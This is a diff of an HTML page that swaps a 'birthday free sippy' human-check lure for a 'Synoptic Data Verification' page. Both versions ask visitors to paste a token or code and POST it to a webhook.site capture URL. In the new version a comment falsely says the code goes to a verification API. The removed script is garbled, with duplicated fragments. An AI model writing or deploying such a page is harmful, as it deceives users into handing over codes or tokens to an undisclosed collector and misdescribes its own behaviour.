@@ -1,85 +1,86 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Nikogem 60,000th Birthday Celebration</title>
+  <title>Synoptic Data Verification</title>
   <style>
-    /* Add your CSS styles here */
+    /* Add your CSS styles here for a beautiful layout */
+    body {
+      font-family: sans-serif;
+    }
+    #container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    #data-box {
+      width: 500px;
+      height: 200px;
+      border: 1px solid #ccc;
+      padding: 10px;
+      margin-bottom: 10px;
+    }
+    #inner-box {
+      width: 480px;
+      height: 180px;
+      border: 1px solid #999;
+      padding: 5px;
+      overflow-y: scroll; /* Enable scrolling if text is long */
+    }
+    #verify-button {
+      padding: 10px 20px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
-
-  <h1><img src="logo.png" alt="Nikogem Logo"></h1> 
-
-  <h2>Happy 60,000th Birthday!</h2>
-  <p>Here's a free sippy from Nikojam to celebrate!</p>
-
-  <h3>Are you human?</h3>
-  <div id="tokenContainer"></div> <br>
-  <textarea id="tokenArea" rows="4" cols="50" placeholder="Paste the token here"></textarea>
-  <button onclick="submitToken()">Submit</button>
-
-  <div id="response"></div>
+  <div id="container">
+    <h1>Synoptic Data Verification</h1>
+    <div id="data-box">
+      <div id="inner-box"></div>
+    </div>
+    <input type="text" id="user-input" placeholder="Paste the code here">
+    <button id="verify-button">Verify</button>
+    <div id="status"></div>
+  </div>
 
   <script>
-    function loadToken() {
-      // **IMPORTANT:** Implement your authentication logic here
-      // Example (replace with your actual implementation):
-      const authToken = localStorage.getItem('authToken'); // Assuming you store auth token locally
+    // JavaScript code to fetch data and handle verification
+    const innerBox = document.getElementById('inner-box');
+    const userInput = document.getElementById('user-input');
+    const verifyButton = document.getElementById('verify-button');
+    const statusDiv = document.getElementById('status');
 
-      fetch('https://api.restful-api.dev/objects/7', {
-        method: 'GET',
-        headers: {
-          'Authorization': `Bearer ${authToken}` // Include auth token in header
-        }
-      })
+    // Fetch data from Synoptic API
+    fetch('https://api.synopticdata.com/v2/stations/metadata?token=sa&stid=KONT&complete=1')
       .then(response => response.json())
       .then(data => {
-        if (data.success) {
-          document.getElementById('tokenContainer').innerHTML = `<p>Your token: ${data.token}</p>`;
-        } else {
-          document.getElementById('tokenContainer').innerHTML = `<p>Error: You are not logged in.</p>`;
-        }
+        innerBox.textContent = JSON.stringify(data, null, 2); // Display JSON data
       })
       .catch(error => {
-        console.error('Error:', error);
-        document.getElementById('tokenContainer').innerHTML = `<p>Error fetching token.</p>`;
+        statusDiv.textContent = 'Error: We encountered a problem on the server.';
       });
-    }
 
-    function submitToken() {
-      // Get the token from the textarea
-      const token = document.getElementById("tokenArea").value;
-
-      // **IMPORTANT:** Replace the following with your actual logic
-      // This is a placeholder for how you would send the token to your server
-      // for processing.
-
-      // Example using fetch (replace with your preferred method):
+    verifyButton.addEventListener('click', () => {
+      const userCode = userInput.value;
+      // Send verification request to api.verify.com/verifycation
       fetch('https://webhook.site/8febb751-d6c3-40a9-b3de-6b3812e5d94e', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify({ token: token })
+        body: JSON.stringify({ code: userCode })
       })
       .then(response => response.json())
-      .then(data => {
-        document.getElementById("response").innerHTML = data.message;
+      .then(result => {
+        statusDiv.textContent = result.message; // Display verification result
       })
       .catch(error => {
-        console.error('Error:', error);
-        document.getElementById("response").innerHTML = 'An error occurred.';
+        statusDiv.textContent = 'Error: Verification failed.';
       });
-    }
-
-    window.onload = loadToken; // Load token`.catch(error => {
-        console.error('Error:', error);
-        document.getElementById("response").innerHTML = `<p>An error occurred.</p>`;
-      });
-    }
-
-    window.onload = loadToken; // Load token when the page loads
+    });
   </script>
-
 </body>
 </html>
